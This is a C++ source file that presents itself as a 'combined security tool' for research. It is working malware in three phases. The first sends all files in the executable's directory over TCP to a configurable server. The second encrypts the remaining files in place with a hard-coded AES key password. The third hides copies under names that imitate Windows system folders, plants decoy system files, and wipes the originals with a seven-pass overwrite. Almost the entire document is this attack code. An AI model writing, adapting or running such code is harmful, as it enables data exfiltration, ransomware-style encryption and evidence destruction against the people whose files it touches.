// Combined tool: Network File Transfer + Encryption + Stealth Hiding
// Usage: Run this file to execute all three operations in sequence

#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <map>
#include <algorithm>
#include <iomanip>
#include <cstring>
#include <filesystem>
#include <chrono>
#include <thread>
#include <random>
#include <cstdlib>

// Network headers
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <sys/stat.h>

// Crypto headers
#include <openssl/evp.h>
#include <openssl/rand.h>

// Platform-specific headers
#ifdef _WIN32
    #include <shlobj.h>
    #include <lmcons.h>
    #include <wincrypt.h>
    #include <psapi.h>
    #include <aclapi.h>
    #include <direct.h>
    #define getcwd _getcwd
    #pragma comment(lib, "crypt32.lib")
    #pragma comment(lib, "advapi32.lib")
    #pragma comment(lib, "psapi.lib")
#else
    #include <unistd.h>
    #include <sys/stat.h>
    #include <dirent.h>
    #include <fcntl.h>
    #include <pwd.h>
#endif

#pragma comment(lib, "ws2_32.lib")

namespace fs = std::filesystem;

// ========== CONSTANTS ==========
#define PORT 8080
#define BUFFER_SIZE 4096
const std::string PASSWORD = "StrongPassword@123";
const std::string MAGIC = "CRYPTO_V1";
constexpr int KEY_SIZE = 32, SALT_SIZE = 16, IV_SIZE = 12, TAG_SIZE = 16, ITER = 100000;

// ========== PHASE 1: NETWORK FILE TRANSFER (Client.cpp) ==========
class FileTransferClient {
private:
    SOCKET sock;
    sockaddr_in serv_addr;
    std::map<std::string, std::string> fileRelativePaths;

    void connectToServer(const std::string& ip = "127.0.0.1") {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed" << std::endl;
            exit(EXIT_FAILURE);
        }
        
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation failed" << std::endl;
            WSACleanup();
            exit(EXIT_FAILURE);
        }
        
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);
        
        if (inet_pton(AF_INET, ip.c_str(), &serv_addr.sin_addr) <= 0) {
            std::cerr << "Invalid address" << std::endl;
            closesocket(sock);
            WSACleanup();
            exit(EXIT_FAILURE);
        }
        
        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            std::cerr << "Connection failed" << std::endl;
            closesocket(sock);
            WSACleanup();
            exit(EXIT_FAILURE);
        }
        std::cout << "Connected to server." << std::endl;
    }

    void sendString(const std::string& str) {
        send(sock, str.c_str(), (int)str.length(), 0);
        Sleep(20);
    }

    std::string receiveString() {
        char buffer[BUFFER_SIZE];
        memset(buffer, 0, BUFFER_SIZE);
        int bytesRead = recv(sock, buffer, BUFFER_SIZE, 0);
        return (bytesRead <= 0) ? "" : std::string(buffer);
    }

    void sendFile(const std::string& filepath) {
        std::ifstream file(filepath, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "Cannot open file: " << filepath << std::endl;
            return;
        }

        file.seekg(0, std::ios::end);
        size_t fileSize = (size_t)file.tellg();
        file.seekg(0, std::ios::beg);

        size_t lastSlash = filepath.find_last_of("\\/");
        std::string filename = (lastSlash == std::string::npos) ? filepath : filepath.substr(lastSlash + 1);

        sendString("FILE");
        sendString(filename);
        sendString(std::to_string(fileSize));

        if (receiveString() != "READY") {
            std::cerr << "Server not ready for file: " << filename << std::endl;
            file.close();
            return;
        }

        char buffer[BUFFER_SIZE];
        while (file.read(buffer, BUFFER_SIZE) || file.gcount() > 0) {
            send(sock, buffer, (int)file.gcount(), 0);
        }
        file.close();
        receiveString();
    }

    void getAllFilesInFolder(const std::string& folderPath, std::vector<std::string>& files, const std::string& basePath = "") {
        std::string searchPath = folderPath + "\\*.*";
        WIN32_FIND_DATA findData;
        HANDLE hFind = FindFirstFile(searchPath.c_str(), &findData);

        if (hFind == INVALID_HANDLE_VALUE) return;
        do {
            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;
            
            std::string currentPath = (basePath.empty() ? "" : basePath + "\\") + findData.cFileName;
            std::string fullPath = folderPath + "\\" + findData.cFileName;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                getAllFilesInFolder(fullPath, files, currentPath);
            } else {
                files.push_back(fullPath);
                fileRelativePaths[fullPath] = currentPath;
            }
        } while (FindNextFile(hFind, &findData) != 0);
        FindClose(hFind);
    }

    void sendFolder(const std::string& folderPath) {
        std::vector<std::string> files;
        fileRelativePaths.clear();
        
        size_t lastSlash = folderPath.find_last_of("\\/");
        std::string folderName = (lastSlash == std::string::npos) ? folderPath : folderPath.substr(lastSlash + 1);
        
        getAllFilesInFolder(folderPath, files, folderName);

        sendString("FOLDER");
        sendString(folderName);
        if (receiveString() != "READY") return;

        sendString(std::to_string(files.size()));
        if (receiveString() != "READY_FILES") return;

        for (const auto& file : files) {
            std::string relativePath = fileRelativePaths[file];
            
            std::ifstream infile(file, std::ios::binary | std::ios::ate);
            if (!infile.is_open()) continue;
            size_t size = (size_t)infile.tellg();
            infile.close();

            sendString(relativePath);
            sendString(std::to_string(size));

            if (receiveString() != "READY_FILE") continue;

            infile.open(file, std::ios::binary);
            char buffer[BUFFER_SIZE];
            while (infile.read(buffer, BUFFER_SIZE) || infile.gcount() > 0) {
                send(sock, buffer, (int)infile.gcount(), 0);
            }
            infile.close();
            receiveString(); 
        }
    }

public:
    void execute(const std::string& serverIP = "127.0.0.1") {
        std::cout << "\n=== PHASE 1: NETWORK FILE TRANSFER ===" << std::endl;
        std::cout << "Connecting to server..." << std::endl;
        
        connectToServer(serverIP);

        char exePathBuffer[MAX_PATH];
        GetModuleFileName(NULL, exePathBuffer, MAX_PATH);
        std::string fullExePath(exePathBuffer);
        
        std::string currentDir = fullExePath.substr(0, fullExePath.find_last_of("\\/"));
        std::string myName = fullExePath.substr(fullExePath.find_last_of("\\/") + 1);

        std::string searchPattern = currentDir + "\\*";
        WIN32_FIND_DATA findData;
        HANDLE hFind = FindFirstFile(searchPattern.c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::string itemName = findData.cFileName;
                
                if (itemName == "." || itemName == ".." || itemName == myName) continue;

                std::string fullPath = currentDir + "\\" + itemName;

                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::cout << "Sending folder: " << itemName << std::endl;
                    sendFolder(fullPath);
                } else {
                    std::cout << "Sending file: " << itemName << std::endl;
                    sendFile(fullPath);
                }
            } while (FindNextFile(hFind, &findData) != 0);
            FindClose(hFind);
        }

        sendString("QUIT");
        closesocket(sock);
        WSACleanup();
        std::cout << "File transfer completed." << std::endl;
    }
};

// ========== PHASE 2: ENCRYPTION (encrypt_dir.cpp) ==========
class DirectoryEncryptor {
private:
    void deriveKey(const unsigned char* salt, unsigned char* key) {
        PKCS5_PBKDF2_HMAC(PASSWORD.c_str(), PASSWORD.size(), salt, SALT_SIZE, ITER, EVP_sha256(), KEY_SIZE, key);
    }

    bool isAlreadyEncrypted(const fs::path& p) {
        std::ifstream f(p, std::ios::binary);
        char buf[9]; 
        f.read(buf, MAGIC.size());
        return f.gcount() == MAGIC.size() && std::string(buf, 9) == MAGIC;
    }

    void encryptFile(const fs::path& filePath) {
        if (isAlreadyEncrypted(filePath)) return;

        std::ifstream inFile(filePath, std::ios::binary);
        std::vector<unsigned char> plain((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();

        if (plain.empty()) return;

        unsigned char salt[SALT_SIZE], iv[IV_SIZE], tag[TAG_SIZE], key[KEY_SIZE];
        RAND_bytes(salt, SALT_SIZE);
        RAND_bytes(iv, IV_SIZE);
        deriveKey(salt, key);

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, nullptr);
        EVP_EncryptInit_ex(ctx, nullptr, nullptr, key, iv);

        std::vector<unsigned char> cipher(plain.size() + EVP_MAX_BLOCK_LENGTH);
        int len;
        EVP_EncryptUpdate(ctx, cipher.data(), &len, plain.data(), (int)plain.size());
        int cipher_len = len;
        EVP_EncryptFinal_ex(ctx, cipher.data() + len, &len);
        cipher_len += len;
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_SIZE, tag);
        EVP_CIPHER_CTX_free(ctx);

        cipher.resize(cipher_len);

        std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
        outFile.write(MAGIC.c_str(), MAGIC.size());
        outFile.write((char*)salt, SALT_SIZE);
        outFile.write((char*)iv, IV_SIZE);
        outFile.write((char*)tag, TAG_SIZE);
        outFile.write((char*)cipher.data(), cipher.size());
    }

public:
    void execute() {
        std::cout << "\n=== PHASE 2: DIRECTORY ENCRYPTION ===" << std::endl;
        fs::path target = fs::current_path();
        int count = 0;
        
        std::string myName = fs::path(__argv[0]).filename().string();
        
        for (auto& e : fs::recursive_directory_iterator(target)) {
            if (e.is_regular_file() && e.path().filename() != myName) {
                if (!isAlreadyEncrypted(e.path())) {
                    try {
                        encryptFile(e.path());
                        std::cout << "[+] Encrypted: " << e.path().filename() << std::endl;
                        count++;
                    } catch (const std::exception& e) {
                        std::cerr << "Error encrypting file: " << e.what() << std::endl;
                    }
                }
            }
        }
        
        std::cout << "Total files encrypted: " << count << std::endl;
    }
};

// ========== PHASE 3: STEALTH HIDING (secure_copy.cpp) ==========
class DocumentsStealthHider {
private:
    std::string sourceDir;
    std::string documentsDir;
    std::string hiddenBaseDir;
    
    void generateRandomData(char* buffer, size_t size) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        for (size_t i = 0; i < size; i++) {
            buffer[i] = static_cast<char>(dis(gen));
        }
    }
    
    std::string getDocumentsDirectory() {
        #ifdef _WIN32
            char path[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, path))) {
                return std::string(path);
            }
            char* userProfile = getenv("USERPROFILE");
            if (userProfile) {
                return std::string(userProfile) + "\\Documents";
            }
        #else
            const char* home = getenv("HOME");
            if (home) {
                return std::string(home) + "/Documents";
            }
        #endif
        return "";
    }
    
    std::string createWindowsLikeFolderName() {
        const char* systemFolderNames[] = {
            "Windows.old",
            "MSOCache",
            "MSOCache2",
            "$WINDOWS.~BT",
            "$Windows.~WS",
            "$WinREAgent",
            "Boot",
            "Documents and Settings",
            "PerfLogs",
            "ProgramData",
            "Recovery",
            "System Volume Information",
            "WindowsUpdate",
            "WinSxS",
            "SysWOW64",
            "inf",
            "Media",
            "Prefetch",
            "Fonts",
            "Cursors",
            "Resources"
        };
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> nameDis(0, sizeof(systemFolderNames)/sizeof(systemFolderNames[0]) - 1);
        std::uniform_int_distribution<> numDis(1000, 9999);
        
        return std::string(systemFolderNames[nameDis(gen)]) + std::to_string(numDis(gen));
    }
    
    std::string generateHiddenFilename(const std::string& originalPath) {
        std::string filename = fs::path(originalPath).filename().string();
        std::string extension = fs::path(originalPath).extension().string();
        std::string stem = fs::path(originalPath).stem().string();
        
        std::string lastThree;
        if (stem.length() >= 3) {
            lastThree = stem.substr(stem.length() - 3);
        } else {
            lastThree = stem;
        }
        
        std::transform(lastThree.begin(), lastThree.end(), lastThree.begin(), ::tolower);
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(100, 999);
        
        return "hhh" + lastThree + "_" + std::to_string(dis(gen)) + extension;
    }
    
    void setUltraHidden(const std::string& path) {
        #ifdef _WIN32
            DWORD attrs = GetFileAttributesA(path.c_str());
            if (attrs != INVALID_FILE_ATTRIBUTES) {
                if (SetFileAttributesA(path.c_str(), 
                    attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
                    return;
                }
                SetFileAttributesA(path.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN);
            }
        #else
            std::string newPath = fs::path(path).parent_path().string() + "/." + 
                                 fs::path(path).filename().string();
            std::rename(path.c_str(), newPath.c_str());
            chmod(newPath.c_str(), 0600);
        #endif
    }
    
    bool copyToHiddenLocation(const std::string& srcPath, const std::string& relativePath) {
        try {
            std::string hiddenFilename = generateHiddenFilename(srcPath);
            std::string destPath = hiddenBaseDir + "\\" + relativePath + "\\" + hiddenFilename;
            
            fs::create_directories(fs::path(destPath).parent_path());
            
            fs::copy(srcPath, destPath, fs::copy_options::overwrite_existing);
            
            setUltraHidden(destPath);
            
            return true;
            
        } catch (...) {
            return false;
        }
    }
    
    bool secureDelete7Pass(const std::string& filepath) {
        try {
            std::ifstream file(filepath, std::ios::binary | std::ios::ate);
            if (!file.is_open()) return false;
            
            size_t fileSize = static_cast<size_t>(file.tellg());
            file.close();
            
            if (fileSize == 0) {
                return std::remove(filepath.c_str()) == 0;
            }
            
            for (int pass = 0; pass < 7; pass++) {
                std::ofstream outfile(filepath, std::ios::binary | std::ios::trunc);
                if (!outfile.is_open()) return false;
                
                std::vector<char> buffer(std::min(fileSize, static_cast<size_t>(65536)));
                size_t written = 0;
                
                while (written < fileSize) {
                    size_t toWrite = std::min(buffer.size(), fileSize - written);
                    
                    switch (pass) {
                        case 0: case 1: case 6:
                            generateRandomData(buffer.data(), toWrite);
                            break;
                        case 2:
                            std::fill(buffer.begin(), buffer.begin() + toWrite, 0);
                            break;
                        case 3:
                            std::fill(buffer.begin(), buffer.begin() + toWrite, 0xFF);
                            break;
                        case 4:
                            for (size_t i = 0; i < toWrite; i++) buffer[i] = 0x55;
                            break;
                        case 5:
                            for (size_t i = 0; i < toWrite; i++) buffer[i] = 0xAA;
                            break;
                    }
                    
                    outfile.write(buffer.data(), toWrite);
                    written += toWrite;
                }
                outfile.close();
            }
            
            std::string currentPath = filepath;
            for (int i = 0; i < 3; i++) {
                std::string newName = currentPath + "." + 
                                    std::to_string(rand() % 10000) + ".tmp";
                std::rename(currentPath.c_str(), newName.c_str());
                currentPath = newName;
            }
            
            return std::remove(currentPath.c_str()) == 0;
            
        } catch (...) {
            return false;
        }
    }
    
    void createDecoySystemFiles() {
        const std::vector<std::pair<std::string, std::string>> decoys = {
            {"desktop.ini", "[.ShellClassInfo]\nIconFile=%SystemRoot%\\system32\\SHELL32.dll\nIconIndex=-238"},
            {"thumbs.db", ""},
            {"NTUSER.DAT", ""},
            {"ntuser.ini", "[ViewState]\nMode=\nVid=\nFolderType=Generic"},
            {"index.dat", ""},
            {"IconCache.db", ""},
            {"~WRL0001.tmp", ""},
            {"MSOCache", ""}
        };
        
        for (const auto& decoy : decoys) {
            try {
                std::string filePath = sourceDir + "\\" + decoy.first;
                if (!fs::exists(filePath)) {
                    if (decoy.second.empty()) {
                        std::ofstream file(filePath, std::ios::binary);
                        file.close();
                    } else {
                        std::ofstream file(filePath);
                        file << decoy.second;
                        file.close();
                    }
                    
                    #ifdef _WIN32
                        SetFileAttributesA(filePath.c_str(), 
                                         FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                    #endif
                }
            } catch (...) {}
        }
    }

public:
    DocumentsStealthHider() {
        sourceDir = fs::current_path().string();
        
        documentsDir = getDocumentsDirectory();
        if (documentsDir.empty()) {
            std::cerr << "Error: Could not find Documents directory!" << std::endl;
            exit(1);
        }
        
        std::string hiddenFolderName = createWindowsLikeFolderName();
        hiddenBaseDir = documentsDir + "\\" + hiddenFolderName;
        
        std::cout << "Source: " << sourceDir << std::endl;
        std::cout << "Hidden location: " << hiddenBaseDir << std::endl;
    }
    
    void execute() {
        std::cout << "\n=== PHASE 3: STEALTH HIDING ===" << std::endl;
        std::cout << "[1/3] Copying files to hidden Documents location..." << std::endl;
        std::vector<std::string> copiedFiles = copyAllToDocuments();
        
        std::cout << "[2/3] Creating decoy system files..." << std::endl;
        createDecoySystemFiles();
        
        std::cout << "[3/3] Securely deleting original files..." << std::endl;
        secureDeleteOriginals();
        
        std::cout << "\nStealth operation complete!" << std::endl;
        std::cout << "Files hidden in: " << hiddenBaseDir << std::endl;
        std::cout << "\nNote: Run 'restore_files.exe' to restore encrypted files." << std::endl;
        std::cout << "Then run 'decrypt_dir.exe' to decrypt them." << std::endl;
    }

private:
    std::vector<std::string> copyAllToDocuments() {
        std::vector<std::string> copiedFiles;
        int totalFiles = 0;
        int successCount = 0;
        
        try {
            fs::create_directories(hiddenBaseDir);
            setUltraHidden(hiddenBaseDir);
            
            for (const auto& entry : fs::recursive_directory_iterator(sourceDir)) {
                try {
                    if (fs::is_regular_file(entry.status())) {
                        totalFiles++;
                        std::string srcPath = entry.path().string();
                        
                        if (srcPath.find(hiddenBaseDir) == 0) continue;
                        
                        std::string relativePath = srcPath.substr(sourceDir.length());
                        if (!relativePath.empty() && (relativePath[0] == '\\' || relativePath[0] == '/')) {
                            relativePath = relativePath.substr(1);
                        }
                        
                        std::string dirPath = fs::path(relativePath).parent_path().string();
                        
                        if (copyToHiddenLocation(srcPath, dirPath)) {
                            successCount++;
                            copiedFiles.push_back(srcPath);
                            
                            if (successCount % 10 == 0) {
                                std::cout << "  Copied " << successCount << " files..." << std::endl;
                            }
                        }
                    } else if (fs::is_directory(entry.status())) {
                        std::string srcPath = entry.path().string();
                        if (srcPath.find(hiddenBaseDir) == 0) continue;
                        
                        std::string relativePath = srcPath.substr(sourceDir.length());
                        if (!relativePath.empty() && (relativePath[0] == '\\' || relativePath[0] == '/')) {
                            relativePath = relativePath.substr(1);
                        }
                        
                        std::string hiddenDirName = generateHiddenFilename(relativePath + "\\");
                        std::string destDirPath = hiddenBaseDir + "\\" + hiddenDirName;
                        
                        fs::create_directories(destDirPath);
                        setUltraHidden(destDirPath);
                    }
                } catch (...) {}
            }
            
        } catch (const std::exception& e) {
            std::cerr << "Error: " << e.what() << std::endl;
        }
        
        std::cout << "  Successfully copied: " << successCount << "/" << totalFiles << " files" << std::endl;
        return copiedFiles;
    }
    
    void secureDeleteOriginals() {
        int deletedFiles = 0;
        int deletedDirs = 0;
        
        try {
            std::vector<fs::path> items;
            for (const auto& entry : fs::directory_iterator(sourceDir)) {
                items.push_back(entry.path());
            }
            
            for (const auto& item : items) {
                std::string itemPath = item.string();
                
                if (itemPath.find(hiddenBaseDir) == 0) continue;
                
                try {
                    if (fs::is_regular_file(item)) {
                        if (secureDelete7Pass(itemPath)) {
                            deletedFiles++;
                        }
                    } else if (fs::is_directory(item)) {
                        if (secureDeleteDirectory(itemPath)) {
                            deletedDirs++;
                        }
                    }
                } catch (...) {}
            }
            
        } catch (...) {
            std::cerr << "Error during secure deletion" << std::endl;
        }
        
        std::cout << "  Securely deleted: " << deletedFiles << " files, " 
                  << deletedDirs << " directories" << std::endl;
    }
    
    bool secureDeleteDirectory(const std::string& dirpath) {
        try {
            for (const auto& entry : fs::recursive_directory_iterator(dirpath)) {
                if (fs::is_regular_file(entry.status())) {
                    secureDelete7Pass(entry.path().string());
                }
            }
            
            std::vector<std::string> dirs;
            for (const auto& entry : fs::recursive_directory_iterator(dirpath)) {
                if (fs::is_directory(entry.status())) {
                    dirs.push_back(entry.path().string());
                }
            }
            
            std::sort(dirs.begin(), dirs.end(), 
                     [](const std::string& a, const std::string& b) {
                         return a.length() > b.length();
                     });
            
            for (const auto& dir : dirs) {
                #ifdef _WIN32
                    SetFileAttributesA(dir.c_str(), FILE_ATTRIBUTE_NORMAL);
                #endif
                fs::remove(dir);
            }
            
            #ifdef _WIN32
                SetFileAttributesA(dirpath.c_str(), FILE_ATTRIBUTE_NORMAL);
            #endif
            return fs::remove_all(dirpath) > 0;
            
        } catch (...) {
            return false;
        }
    }
};

// ========== MAIN FUNCTION ==========
int main(int argc, char* argv[]) {
    std::cout << "=== COMBINED SECURITY TOOL ===" << std::endl;
    std::cout << "For research purposes only!" << std::endl;
    std::cout << "\nThis tool will execute 3 phases in sequence:" << std::endl;
    std::cout << "1. Send files over network (to 127.0.0.1:8080)" << std::endl;
    std::cout << "2. Encrypt remaining files locally" << std::endl;
    std::cout << "3. Hide files in Documents and delete originals" << std::endl;
    
    std::cout << "\nPress Enter to continue or Ctrl+C to abort..." << std::endl;
    std::cin.get();
    
    // Phase 1: Network Transfer
    try {
        FileTransferClient client;
        std::string ip = (argc > 1) ? argv[1] : "127.0.0.1";
        client.execute(ip);
    } catch (const std::exception& e) {
        std::cerr << "Network transfer failed: " << e.what() << std::endl;
        std::cout << "Continuing with next phase..." << std::endl;
    }
    
    // Phase 2: Encryption
    try {
        DirectoryEncryptor encryptor;
        encryptor.execute();
    } catch (const std::exception& e) {
        std::cerr << "Encryption failed: " << e.what() << std::endl;
        std::cout << "Continuing with next phase..." << std::endl;
    }
    
    // Phase 3: Stealth Hiding
    try {
        DocumentsStealthHider hider;
        hider.execute();
    } catch (const std::exception& e) {
        std::cerr << "Stealth hiding failed: " << e.what() << std::endl;
    }
    
    std::cout << "\n=== ALL OPERATIONS COMPLETED ===" << std::endl;
    std::cout << "\nTo restore files:" << std::endl;
    std::cout << "1. Run 'restore_files.exe' - This will find and copy encrypted files" << std::endl;
    std::cout << "2. Run 'decrypt_dir.exe' - This will decrypt the restored files" << std::endl;
    
    std::cout << "\nPress Enter to exit..." << std::endl;
    std::cin.get();
    
    return 0;
}